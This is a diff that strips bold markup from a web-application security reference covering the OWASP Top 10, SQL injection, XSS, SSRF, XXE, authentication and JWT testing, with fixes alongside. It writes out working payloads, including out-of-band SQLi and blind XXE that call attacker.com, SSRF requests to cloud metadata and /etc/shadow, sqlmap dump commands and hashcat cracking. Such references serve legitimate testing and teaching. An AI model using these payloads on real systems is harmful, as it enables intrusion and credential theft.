@@ -4,9 +4,9 @@
 
 | | |
 |---|---|
-| **Read this when** | Testing a web app or API against the OWASP Top 10, writing an SQLi/XSS/SSRF payload or its fix, hardening auth, sessions, headers, or a WAF |
-| **Start at** | [OWASP Top 10 2021](#_1-owasp-top-10-2021), [Web App Testing Methodology](#_5-web-app-testing-methodology), [Business Logic and API Security](#_7-business-logic-and-api-security) |
-| **Pairs with** | [WEB_APPLICATION_PENTESTING.md](WEB_APPLICATION_PENTESTING.md), [API_SECURITY_REFERENCE.md](API_SECURITY_REFERENCE.md), [SECURE_CODING_REFERENCE.md](SECURE_CODING_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md) |
+| Read this when | Testing a web app or API against the OWASP Top 10, writing an SQLi/XSS/SSRF payload or its fix, hardening auth, sessions, headers, or a WAF |
+| Start at | [OWASP Top 10 2021](#_1-owasp-top-10-2021), [Web App Testing Methodology](#_5-web-app-testing-methodology), [Business Logic and API Security](#_7-business-logic-and-api-security) |
+| Pairs with | [WEB_APPLICATION_PENTESTING.md](WEB_APPLICATION_PENTESTING.md), [API_SECURITY_REFERENCE.md](API_SECURITY_REFERENCE.md), [SECURE_CODING_REFERENCE.md](SECURE_CODING_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md) |
 
 ---
 
@@ -27,36 +27,36 @@
 
 ## 1. OWASP Top 10 2021
 
-> **Currency note:** The current edition is **OWASP Top 10:2025** (published 2025). Key changes from 2021: SSRF (the 2021 A10) is folded into **A01 Broken Access Control**; a new **A03 Software Supply Chain Failures** expands the 2021 A06 Vulnerable and Outdated Components; and a new **A10 Mishandling of Exceptional Conditions** is added. 2025 order: A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions. The A01–A10 detail below is retained as the **2021 edition** for crosswalk/history.
+> Currency note: The current edition is OWASP Top 10:2025 (published 2025). Key changes from 2021: SSRF (the 2021 A10) is folded into A01 Broken Access Control; a new A03 Software Supply Chain Failures expands the 2021 A06 Vulnerable and Outdated Components; and a new A10 Mishandling of Exceptional Conditions is added. 2025 order: A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions. The A01-A10 detail below is retained as the 2021 edition for crosswalk/history.
 
 ### A01 Broken Access Control
 
 Broken Access Control is the number one web application risk. It occurs when users can act outside of their intended permissions.
 
-**Insecure Direct Object Reference (IDOR)**
+Insecure Direct Object Reference (IDOR)
 - Attacker changes an object identifier (ID, filename, GUID) to access another user's data
 - Test: change `user_id=123` to `user_id=124` in every parameter: body, query string, cookie, header
 - Horizontal privilege escalation: access peer resources; vertical: access admin resources
 - Tools: Burp Autorize extension auto-tests every request with a low-privilege session token
 
-**Path Traversal**
+Path Traversal
 - `../../../../etc/passwd` directory traversal to read arbitrary files
 - URL-encoded variants: `..%2F..%2F..%2Fetc%2Fpasswd`, `..%252F` double-encoded
 - Mitigation: canonicalize paths server-side, validate against allowed base directory
 
-**CORS Misconfiguration**
+CORS Misconfiguration
 - `Access-Control-Allow-Origin: *` with credentials exposes authenticated APIs
 - Regex bypass: server trusts `evil.target.com` when checking for `target.com`
 - Null origin abuse: sandboxed iframes emit `Origin: null`; if trusted, attacker-controlled data URI exploits it
 - Test: send `Origin: https://attacker.com` and inspect response headers
 - Secure: never reflect arbitrary Origin; never combine wildcard with allow-credentials true
 
-**Forced Browsing**
+Forced Browsing
 - Access unlinked admin pages, backup files, configuration files
 - Common targets: `/admin`, `/backup.zip`, `/.env`, `/phpinfo.php`, `/server-status`, `/.git/config`
 - Tools: gobuster, ffuf, dirbuster with SecLists wordlists
 
-**Access Control Testing Checklist**
+Access Control Testing Checklist
 - [ ] Test all object IDs in all HTTP methods (GET/POST/PUT/DELETE/PATCH)
 - [ ] Test with no auth token, expired token, different user's token
 - [ ] Test parameter pollution: `user_id=own&user_id=victim`
@@ -67,17 +67,17 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A02 Cryptographic Failures
 
-**Weak Algorithms**
+Weak Algorithms
 - Deprecated: MD5, SHA-1, DES, 3DES, RC4, RSA less than 2048-bit
 - Current standard: AES-256-GCM, ChaCha20-Poly1305, RSA-2048+, SHA-256+
 - TLS: require TLS 1.2 minimum; TLS 1.3 preferred; disable SSLv3, TLS 1.0, TLS 1.1
 
-**Testing Tools**
+Testing Tools
 - `testssl.sh --full https://target.com` comprehensive TLS/SSL assessment
 - `sslyze --regular target.com:443` fast TLS scanner
 - Check for: BEAST, POODLE, CRIME, BREACH, Heartbleed, ROBOT, DROWN vulnerabilities
 
-**Hardcoded Credentials and Secrets**
+Hardcoded Credentials and Secrets
 - Grep source for: `password=`, `secret=`, `api_key=`, `BEGIN RSA`, `AWS_SECRET`
 - Tools: TruffleHog, GitLeaks, detect-secrets for pre-commit scanning
 - Use secret managers: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault
@@ -86,19 +86,19 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A03 Injection
 
-**SQL Injection** - See Section 2 for deep dive.
+SQL Injection - See Section 2 for deep dive.
 
-**OS Command Injection**
+OS Command Injection
 - Vulnerable: `os.system(f"ping {user_input}")` inject `; cat /etc/passwd`
 - Chaining: `;`, `&&`, `||`, `|`, backticks, `$()` subshell
 - Prevention: use subprocess with list args; never shell=True
 
-**LDAP Injection**
+LDAP Injection
 - Inject into LDAP filters: wildcards bypass authentication
 - Payload: username `admin)(|(password=*)`
 - Prevention: escape special characters per RFC 4515
 
-**XPath Injection**
+XPath Injection
 - `' or '1'='1` bypasses XML-based authentication
 - Prevention: parameterized XPath queries
 
@@ -106,7 +106,7 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A04 Insecure Design
 
-**STRIDE Threat Modeling**
+STRIDE Threat Modeling
 | Threat | Property Violated | Example |
 |--------|------------------|---------|
 | Spoofing | Authentication | Fake login as another user |
@@ -116,7 +116,7 @@ Broken Access Control is the number one web application risk. It occurs when use
 | Denial of Service | Availability | Exhaust API rate limits |
 | Elevation of Privilege | Authorization | User to Admin |
 
-**Design-Level Controls**
+Design-Level Controls
 - Rate limiting on all authentication endpoints (lockout, CAPTCHA after N failures)
 - Separate high-value operations (fund transfers require re-authentication)
 - Business logic constraints at data layer, not just UI
@@ -125,14 +125,14 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A05 Security Misconfiguration
 
-**Common Misconfigurations**
+Common Misconfigurations
 - Default credentials: `admin:admin`, `admin:password`, vendor-specific defaults
 - Verbose error messages exposing stack traces, SQL queries, internal paths
 - Unnecessary features: directory listing, DEBUG mode, sample apps
 - Missing security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options
 - Cloud: S3 bucket public access, open security groups, IMDSv1
 
-**Testing Tools**
+Testing Tools
 - `nikto -h https://target.com` web server misconfiguration scanner
 - `nuclei -u https://target.com -t misconfigurations/` template-based detection
 - `nuclei -u https://target.com -t exposures/` exposed files and panels
@@ -141,14 +141,14 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A06 Vulnerable and Outdated Components
 
-**Software Composition Analysis (SCA)**
+Software Composition Analysis (SCA)
 - `snyk test` scan dependencies for known CVEs (npm, pip, Maven, Go, etc.)
 - `grype image:latest` container image vulnerability scanning
 - `trivy fs . --security-checks vuln` filesystem scan
 - OWASP Dependency-Check: `dependency-check --scan ./`
 - GitHub Dependabot: automated PR creation for vulnerable dependency updates
 
-**Risk Assessment**
+Risk Assessment
 - CVSSv3 score 7.0 or higher: high priority remediation
 - Check NVD (nvd.nist.gov), OSV (osv.dev), GitHub Advisory Database
 - Scan full dependency tree including transitive dependencies
@@ -163,7 +163,7 @@ Broken Access Control is the number one web application risk. It occurs when use
 - Insecure session tokens: predictable, short, or reused after logout
 - Session fixation: server does not rotate session ID after authentication
 
-**Testing Approach**
+Testing Approach
 - Enumerate valid usernames via response differences (timing or message)
 - Test account lockout bypass: IP rotation, case variation, username whitespace
 - Verify MFA: replay OTP, skip MFA step via direct URL access
@@ -173,13 +173,13 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A08 Software and Data Integrity Failures
 
-**Insecure Deserialization**
+Insecure Deserialization
 - Java: gadget chains (ysoserial payloads) leading to RCE
 - Python pickle: `pickle.loads(user_data)` arbitrary code execution
 - PHP unserialize with magic methods: `__wakeup`, `__destruct`
 - JWT: algorithm confusion, none algorithm bypass
 
-**CI/CD Pipeline Security**
+CI/CD Pipeline Security
 - Protect branch protections; require signed commits
 - Pin GitHub Actions to commit SHA, not mutable tag
 - Secret scanning: GitLeaks, truffleHog in pre-commit hooks
@@ -189,13 +189,13 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 ### A09 Security Logging and Monitoring Failures
 
-**What Must Be Logged**
+What Must Be Logged
 - All authentication events (success, failure, lockout)
 - Access control failures (403s, unauthorized object access)
 - Input validation failures (injection attempts, format violations)
 - High-value transactions (financial, admin operations, data export)
 
-**Log Quality Requirements**
+Log Quality Requirements
 - Timestamp (UTC), user identity, source IP, action taken, result
 - Logs must be tamper-evident; ship to separate log aggregation system
 - Alert on: login failures more than 5 per minute, impossible travel, privilege escalation
@@ -206,7 +206,7 @@ Broken Access Control is the number one web application risk. It occurs when use
 
 See Section 6 for comprehensive SSRF coverage.
 
-**Quick Reference**
+Quick Reference
 - Any user-controlled URL the server fetches is a potential SSRF vector
 - Test all URL parameters, file upload endpoints, webhook configurations, PDF/image generators
 - Primary impact: internal network scanning, cloud metadata theft, potential RCE
@@ -216,29 +216,29 @@ See Section 6 for comprehensive SSRF coverage.
 
 ### Injection Types
 
-**Union-Based SQLi**
+Union-Based SQLi
 - Requires same number of columns and compatible data types
 - Discovery: `ORDER BY 1--`, `ORDER BY 2--`, continue until error to find column count
 - Extraction: `UNION SELECT null,table_name,null FROM information_schema.tables--`
 - Find string columns: replace nulls with `'a'` until no error
 
-**Error-Based SQLi**
+Error-Based SQLi
 - MySQL: `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))`
 - MySQL: `UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)`
 - MSSQL: `CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))`
 
-**Boolean-Based Blind SQLi**
+Boolean-Based Blind SQLi
 - True: `' AND 1=1--` vs False: `' AND 1=2--`
 - Extract char by char: `' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`
 - Binary search on ASCII value reduces requests by half per character
 
-**Time-Based Blind SQLi**
+Time-Based Blind SQLi
 - MySQL: `' AND IF(1=1, SLEEP(5), 0)--`
 - MSSQL: `'; WAITFOR DELAY '0:0:5'--`
 - PostgreSQL: `'; SELECT pg_sleep(5)--`
 - Oracle: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`
 
-**Out-of-Band SQLi**
+Out-of-Band SQLi
 - MSSQL xp_dirtree: `EXEC master..xp_dirtree '\\attacker.com\file'`
 - Oracle UTL_HTTP: `SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual`
 
@@ -246,7 +246,7 @@ See Section 6 for comprehensive SSRF coverage.
 
 ### SQLmap Usage Reference
 
-**Basic Enumeration**
+Basic Enumeration
 ```bash
 # Detect and enumerate databases
 sqlmap -u "https://target.com/item?id=1" --dbs
@@ -261,7 +261,7 @@ sqlmap -u "https://target.com/item?id=1" -D target_db -T users --dump
 sqlmap -u "https://target.com/item?id=1" -D target_db -T users -C username,password --dump
 ```
 
-**Advanced Options**
+Advanced Options
 ```bash
 # Increase detection sensitivity (slower)
 sqlmap -u "https://target.com/item?id=1" --level=5 --risk=3
@@ -288,7 +288,7 @@ sqlmap -u "https://target.com/login" --data="username=admin&password=test" -p us
 sqlmap -r request.txt --level=3 --risk=2
 ```
 
-**Common Tamper Scripts**
+Common Tamper Scripts
 | Tamper | Purpose |
 |--------|---------|
 | `space2comment` | Replace spaces with `/**/` |
@@ -333,7 +333,7 @@ sqlmap -r request.txt --level=3 --risk=2
 
 ### Prevention: Parameterized Queries
 
-**Python psycopg2**
+Python psycopg2
 ```python
 # Safe parameterized query
 cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
@@ -342,7 +342,7 @@ cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
 cursor.execute("SELECT * FROM users WHERE username = %(name)s", {"name": username})
 ```
 
-**Java PreparedStatement**
+Java PreparedStatement
 ```java
 PreparedStatement stmt = conn.prepareStatement(
     "SELECT * FROM users WHERE username = ? AND password = ?"
@@ -352,14 +352,14 @@ stmt.setString(2, password);
 ResultSet rs = stmt.executeQuery();
 ```
 
-**PHP PDO**
+PHP PDO
 ```php
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
 $stmt->execute(['username' => $username]);
 $user = $stmt->fetch();
 ```
 
-**Additional Defenses**
+Additional Defenses
 - Principle of least privilege: app DB user should not have DROP/ALTER rights
 - Stored procedures (when they do not use dynamic SQL internally)
 - Web Application Firewall as defense-in-depth (not primary control)
@@ -370,18 +370,18 @@ $user = $stmt->fetch();
 
 ### XSS Types
 
-**Reflected XSS**
+Reflected XSS
 - Payload in request, reflected immediately in response
 - Requires victim to click crafted link
 - Test: inject `<script>alert(1)</script>` in all input parameters
 - Higher severity when combined with CSRF or session hijacking
 
-**Stored XSS**
+Stored XSS
 - Payload persisted in database/filesystem, served to all users
 - Test in: comments, profiles, usernames, titles, product descriptions, support tickets
 - Impact: account takeover of all users who view the page including admins
 
-**DOM-Based XSS**
+DOM-Based XSS
 - Payload processed by client-side JavaScript, never reaches server
 - Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`
 - Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `src` assignment
@@ -391,7 +391,7 @@ $user = $stmt->fetch();
 
 ### Testing Methodology
 
-**Initial Detection Payloads**
+Initial Detection Payloads
 ```
 Basic script tag:   <script>alert(1)</script>
 SVG onload:         <svg onload=alert(1)>
@@ -399,7 +399,7 @@ Image error:        <img src=x onerror=alert(1)>
 Attribute break:    "><script>alert(1)</script>
 ```
 
-**Context Analysis**
+Context Analysis
 Identify where input is reflected:
 - Between HTML tags: inject HTML/script tags
 - Inside HTML attribute (quoted): close attribute, inject event handler
@@ -407,7 +407,7 @@ Identify where input is reflected:
 - Inside JavaScript template literal: inject `${alert(1)}`
 - Inside URL attribute: `javascript:alert(1)`
 
-**Filter Bypass Techniques**
+Filter Bypass Techniques
 ```
 Case variation:
   <ScRiPt>alert(1)</ScRiPt>
@@ -439,7 +439,7 @@ Word filter bypass:
 
 ### Content Security Policy (CSP)
 
-**Secure CSP Header**
+Secure CSP Header
 ```
 Content-Security-Policy:
   default-src 'self';
@@ -454,7 +454,7 @@ Content-Security-Policy:
   report-uri /csp-report-endpoint
 ```
 
-**CSP Bypass Vectors**
+CSP Bypass Vectors
 - `unsafe-inline` present: CSP bypassed via inline scripts
 - `unsafe-eval` present: bypass via `eval()`, `Function()`, `setTimeout(string)`
 - Whitelisted CDN with user uploads: upload JSONP endpoint or Angular library
@@ -475,13 +475,13 @@ Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
 
 ### CSRF
 
-**Testing**
+Testing
 - Remove CSRF token: does request succeed?
 - Use dummy CSRF token value: does request succeed?
 - Change POST to GET: does action execute?
 - Change Content-Type to text/plain: does CORS preflight apply?
 
-**Prevention**
+Prevention
 ```
 SameSite cookie (strongest defense):
   Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
@@ -506,19 +506,19 @@ Generate hash: `openssl dgst -sha384 -binary script.js | openssl base64 -A`
 
 ### Advanced Client-Side Attacks
 
-**DOM Clobbering**
+DOM Clobbering
 - HTML elements with `id` or `name` attributes override global JS variables
 - `<form id="config"><input name="url" value="https://evil.com"></form>` clobbers `config.url`
 - Leads to XSS when clobbered value flows to a dangerous sink
 
-**Prototype Pollution**
+Prototype Pollution
 - Pollute `Object.prototype` with attacker-controlled properties
 - Payload: `{"__proto__": {"isAdmin": true}}` in JSON merge operations
 - Test with: `?__proto__[polluted]=true` in query strings, JSON bodies
 - Impact: property injection into all objects; potential RCE in Node.js via child_process spawning
 - Detection: Burp extension Server-Side Prototype Pollution Scanner
 
-**BeEF (Browser Exploitation Framework)**
+BeEF (Browser Exploitation Framework)
 - Hook victim browser via XSS-injected script tag pointing to hook.js
 - Capabilities: keylogging, webcam access, network scanning, credential phishing
 - Use in authorized penetration tests only to demonstrate XSS business impact
@@ -528,12 +528,12 @@ Generate hash: `openssl dgst -sha384 -binary script.js | openssl base64 -A`
 
 ### Username Enumeration
 
-**Response Difference Enumeration**
+Response Difference Enumeration
 - Different error messages: "Invalid username" vs "Invalid password"
 - Different HTTP status codes or response lengths
 - Timing differences: password hash computation only occurs for valid usernames
 
-**Timing Attack**
+Timing Attack
 - Valid username: server computes bcrypt hash (100-300ms)
 - Invalid username: server returns immediately (less than 5ms)
 - Mitigation: constant-time comparison; always compute hash even for invalid usernames
@@ -561,17 +561,17 @@ done
 
 ### MFA Bypass Techniques
 
-- **Step skipping**: authenticate at `/login` then directly navigate to `/dashboard` bypassing `/mfa`
-- **Token reuse**: OTP valid for longer than intended time window
-- **Brute force**: 6-digit TOTP = 1,000,000 combinations; 4-digit PIN = 10,000
-- **Response manipulation**: change `{"mfa_required": true}` to `false` in Burp
-- **Race condition**: simultaneous requests may bypass sequential MFA check
+- Step skipping: authenticate at `/login` then directly navigate to `/dashboard` bypassing `/mfa`
+- Token reuse: OTP valid for longer than intended time window
+- Brute force: 6-digit TOTP = 1,000,000 combinations; 4-digit PIN = 10,000
+- Response manipulation: change `{"mfa_required": true}` to `false` in Burp
+- Race condition: simultaneous requests may bypass sequential MFA check
 
 ---
 
 ### JWT Security
 
-**JWT Tool Usage**
+JWT Tool Usage
 ```bash
 pip install jwt_tool
 
@@ -591,14 +591,14 @@ python3 jwt_tool.py <JWT> -T
 python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
 ```
 
-**Hashcat JWT Cracking**
+Hashcat JWT Cracking
 ```bash
 # Mode 16500 = JWT HS256/HS384/HS512
 hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
 ```
 
-**JWT Vulnerabilities**
+JWT Vulnerabilities
 | Vulnerability | Description | Test |
 |--------------|-------------|------|
 | alg: none | No signature validation | Change alg to none, remove signature |
@@ -612,35 +612,35 @@ hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
 
 ### OAuth 2.0 Vulnerabilities
 
-**State Parameter CSRF**
+State Parameter CSRF
 - If state param absent or not validated: attacker can initiate OAuth flow and bind victim account
 
-**redirect_uri Manipulation**
+redirect_uri Manipulation
 - `redirect_uri=https://attacker.com` delivers authorization code to attacker
 - Bypass via subdomain takeover, path traversal, or open redirect chaining on whitelisted domain
 
-**Implicit Flow Token Leakage**
+Implicit Flow Token Leakage
 - Tokens returned in URL fragment, logged in browser history and server logs
 
-**Authorization Code Interception**
+Authorization Code Interception
 - PKCE (Proof Key for Code Exchange) prevents authorization code theft in public clients
 
 ---
 
 ### SAML Vulnerabilities
 
-**XML Signature Wrapping (XSW)**
+XML Signature Wrapping (XSW)
 - Move signed element; insert unsigned element with attacker-controlled attributes
 - Tool: SAML Raider (Burp extension) for automated XSW testing
 
-**Signature Stripping**
+Signature Stripping
 - Remove `<ds:Signature>` element; if server does not verify absence of signature: bypass
 
 ---
 
 ### Session Management
 
-**Session Security Checklist**
+Session Security Checklist
 - [ ] New session ID issued after login (prevent fixation)
 - [ ] Session invalidated server-side on logout (not just cookie deletion)
 - [ ] Session ID has sufficient entropy (128+ bits): test with Burp Sequencer
@@ -649,7 +649,7 @@ hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
 - [ ] SameSite=Strict or Lax prevents CSRF via cookies
 - [ ] Absolute timeout (8 hours) and idle timeout (30 minutes)
 
-**Burp Sequencer Analysis**
+Burp Sequencer Analysis
 ```
 1. Burp -> Sequencer -> select request with session token response
 2. Define token location (cookie value or response body)
@@ -662,7 +662,7 @@ hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
 
 ### Password Hashing
 
-**Secure Algorithms**
+Secure Algorithms
 | Algorithm | Recommended Parameters | Notes |
 |-----------|----------------------|-------|
 | Argon2id | m=65536, t=3, p=4 | OWASP first choice |
@@ -670,7 +670,7 @@ hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
 | scrypt | N=2^17, r=8, p=1 | Memory-hard |
 | PBKDF2-SHA256 | 600,000 iterations | FIPS compliant |
 
-**Never Use for Passwords**
+Never Use for Passwords
 - MD5, SHA-1, SHA-256/512 (unsalted or salted but fast)
 - Plain text, base64, simple reversible encryption
 
@@ -692,7 +692,7 @@ ph.verify(hashed, password)
 
 ### Burp Suite Professional Complete Reference
 
-**Core Workflow Setup**
+Core Workflow Setup
 ```
 1. Proxy -> Options -> set listener 127.0.0.1:8080
 2. Install Burp CA cert -> browser proxy -> http://burp -> CA Certificate
@@ -701,7 +701,7 @@ ph.verify(hashed, password)
 5. Enable passive scanning via Dashboard
 ```
 
-**Intruder Attack Types**
+Intruder Attack Types
 | Mode | Use Case | Example |
 |------|----------|---------|
 | Sniper | Single position, one wordlist | Password bruteforce |
@@ -709,7 +709,7 @@ ph.verify(hashed, password)
 | Pitchfork | Multiple positions, parallel wordlists | Username list paired with password list |
 | Cluster Bomb | Multiple positions, all combinations | Full username x password bruteforce |
 
-**Essential Burp Extensions**
+Essential Burp Extensions
 | Extension | Purpose |
 |-----------|---------|
 | Autorize | Automatic access control testing with low-priv session |
@@ -722,7 +722,7 @@ ph.verify(hashed, password)
 | InQL | GraphQL security testing |
 | JWT Editor | JWT manipulation and attack |
 
-**Burp Collaborator for OOB Detection**
+Burp Collaborator for OOB Detection
 ```
 1. Burp -> Collaborator -> Copy to clipboard (get unique subdomain)
 2. Use in payloads: http://burp-collab-id.oastify.com
@@ -734,7 +734,7 @@ ph.verify(hashed, password)
 
 ### Reconnaissance
 
-**Passive Recon (No Active Requests to Target)**
+Passive Recon (No Active Requests to Target)
 ```bash
 # Subdomain enumeration passive sources
 subfinder -d target.com -o subdomains.txt
@@ -758,7 +758,7 @@ shodan search hostname:target.com
 shodan search "org:Target Company" http.status:200
 ```
 
-**Active Recon**
+Active Recon
 ```bash
 # DNS bruteforce
 amass enum -active -brute -d target.com -o amass_active.txt
@@ -785,7 +785,7 @@ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
 
 ### HTTP Security Header Assessment
 
-**Required Headers**
+Required Headers
 ```bash
 # Quick check
 curl -sI https://target.com | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer-policy"
@@ -795,7 +795,7 @@ testssl.sh --headers https://target.com
 # Graded: https://securityheaders.com or https://observatory.mozilla.org
 ```
 
-**Header Reference**
+Header Reference
 | Header | Recommended Value | Protects Against |
 |--------|------------------|-----------------|
 | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, downgrade |
@@ -809,18 +809,18 @@ testssl.sh --headers https://target.com
 
 ### OWASP Testing Guide v4.2 Key Test Cases
 
-**Information Gathering**
+Information Gathering
 - OTG-INFO-001: Conduct Search Engine Discovery
 - OTG-INFO-002: Fingerprint Web Server
 - OTG-INFO-004: Enumerate Application on Webserver
 - OTG-INFO-006: Identify Application Entry Points
 
-**Authentication Testing**
+Authentication Testing
 - OTG-AUTHN-001: Test Credentials Transported over Encrypted Channel
 - OTG-AUTHN-003: Test Account Lockout Mechanism
 - OTG-AUTHN-004: Test Bypass Authentication Schema
 
-**Authorization Testing**
+Authorization Testing
 - OTG-AUTHZ-001: Test Directory Traversal / File Include
 - OTG-AUTHZ-002: Test Bypassing Authorization Schema
 - OTG-AUTHZ-003: Test Privilege Escalation
@@ -830,7 +830,7 @@ testssl.sh --headers https://target.com
 
 ### JavaScript Analysis
 
-**Endpoint Discovery**
+Endpoint Discovery
 ```bash
 # LinkFinder — extract endpoints from JS files
 python3 linkfinder.py -i https://target.com/app.js -o cli
@@ -844,7 +844,7 @@ cat gau.txt | grep "\.js$" | while read url; do
 done | sort -u > endpoints.txt
 ```
 
-**Source Map Analysis**
+Source Map Analysis
 ```bash
 # Download source map and analyze with source-map-explorer
 wget https://target.com/static/js/main.chunk.js.map
@@ -857,7 +857,7 @@ source-map-explorer main.chunk.js main.chunk.js.map
 
 ### SSRF Server-Side Request Forgery
 
-**Common SSRF Entry Points**
+Common SSRF Entry Points
 - URL parameters: `?url=`, `?redirect=`, `?src=`, `?href=`, `?link=`, `?path=`, `?proxy=`
 - File paths: upload features that fetch remote content
 - Webhook configurations: Slack/Discord/GitHub webhook URLs
@@ -865,7 +865,7 @@ source-map-explorer main.chunk.js main.chunk.js.map
 - Image processors: resize/optimize fetching remote images
 - Import features: CSV/XML import from URL, OpenGraph preview fetchers
 
-**SSRF Detection with Burp Collaborator**
+SSRF Detection with Burp Collaborator
 ```
 1. Generate Collaborator payload: https://xxxx.oastify.com
 2. Submit as URL parameter value
@@ -878,7 +878,7 @@ source-map-explorer main.chunk.js main.chunk.js.map
 
 ### SSRF Payloads
 
-**Internal Network Scanning**
+Internal Network Scanning
 ```
 http://127.0.0.1:22       SSH
 http://127.0.0.1:80       HTTP
@@ -895,7 +895,7 @@ http://172.16.0.0/12      internal RFC 1918
 http://192.168.0.0/16     internal RFC 1918
 ```
 
-**Cloud Metadata Endpoints**
+Cloud Metadata Endpoints
 ```bash
 # AWS IMDSv1 (unauthenticated)
 http://169.254.169.254/latest/meta-data/
@@ -918,7 +918,7 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 http://169.254.169.254/metadata/v1/
 ```
 
-**Protocol Handler Payloads**
+Protocol Handler Payloads
 ```
 file:///etc/passwd
 file:///etc/shadow
@@ -934,7 +934,7 @@ gopher://127.0.0.1:25/...           SMTP via gopher
 
 ### SSRF Filter Bypass Techniques
 
-**IP Representation Bypass**
+IP Representation Bypass
 ```
 Decimal:   http://2130706433/         represents 127.0.0.1
 Octal:     http://0177.0.0.1/
@@ -944,14 +944,14 @@ IPv6:      http://[::1]/
 DNS alias: http://localtest.me/       resolves to 127.0.0.1
 ```
 
-**URL Parsing Confusion**
+URL Parsing Confusion
 ```
 @ symbol:      http://attacker.com@127.0.0.1/
 Fragment:      http://127.0.0.1#attacker.com
 Open redirect: https://target.com/redirect?url=http://127.0.0.1:8080/admin
 ```
 
-**DNS Rebinding**
+DNS Rebinding
 1. Point attacker domain to legitimate IP (passes IP filter check)
 2. TTL expires; re-resolve to 127.0.0.1
 3. Server fetches again and hits internal address
@@ -972,7 +972,7 @@ Via gopher:// protocol, send Redis commands:
 
 ### XXE XML External Entity Injection
 
-**Basic XXE**
+Basic XXE
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -981,7 +981,7 @@ Via gopher:// protocol, send Redis commands:
 <root><data>&xxe;</data></root>
 ```
 
-**Blind XXE via OOB (Out-of-Band)**
+Blind XXE via OOB (Out-of-Band)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -998,7 +998,7 @@ evil.dtd hosted on attacker server:
 %wrapper;
 ```
 
-**XXE via Error Message**
+XXE via Error Message
 ```xml
 <!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -1008,12 +1008,12 @@ evil.dtd hosted on attacker server:
 ]>
 ```
 
-**XXE in File Uploads**
+XXE in File Uploads
 - SVG uploads: embed DOCTYPE in SVG XML
 - XLSX/DOCX: ZIP archives containing XML; modify word/document.xml
 - SAML requests: XML-based authentication flow
 
-**XXE Prevention**
+XXE Prevention
 ```java
 // Java SAXParserFactory disable external entities
 SAXParserFactory factory = SAXParserFactory.newInstance();
@@ -1033,14 +1033,14 @@ tree = ET.parse(xmlfile)  # Blocks XXE by default
 
 ### Business Logic Vulnerabilities
 
-**Price and Value Manipulation**
+Price and Value Manipulation
 ```
 Test negative quantities:   {"product_id": 1, "quantity": -1}
 Test zero price:            {"price": 0.00, "product_id": 1}
 Test integer overflow:      {"quantity": 2147483648}
 ```
 
-**Coupon Race Condition Testing**
+Coupon Race Condition Testing
 ```python
 import asyncio, aiohttp
 
@@ -1053,13 +1053,13 @@ async def race():
         return await asyncio.gather(*tasks)
 ```
 
-**Workflow Bypass**
+Workflow Bypass
 - Multi-step checkout: navigate directly to `/confirm-order` skipping payment step
 - Password reset flow: access step 3 without completing steps 1-2
 - Email verification: access post-verification features before verifying
 - Test all state transitions: can step N be reached from step N-3 directly?
 
-**Mass Assignment via Extra JSON Fields**
+Mass Assignment via Extra JSON Fields
 ```json
 POST /api/users/update
 {
@@ -1071,7 +1071,7 @@ POST /api/users/update
 }
 ```
 
-**Predictable Resource IDs**
+Predictable Resource IDs
 - Sequential integer IDs: increment/decrement to access other records (classic IDOR)
 - Test: create two accounts, compare IDs of created resources for patterns
 
@@ -1079,7 +1079,7 @@ POST /api/users/update
 
 ### OWASP API Security Top 10 (2023)
 
-**API1 Broken Object Level Authorization (BOLA)**
+API1 Broken Object Level Authorization (BOLA)
 ```bash
 # Replace your ID with another user's ID in every endpoint
 GET /api/v1/orders/1001   your order
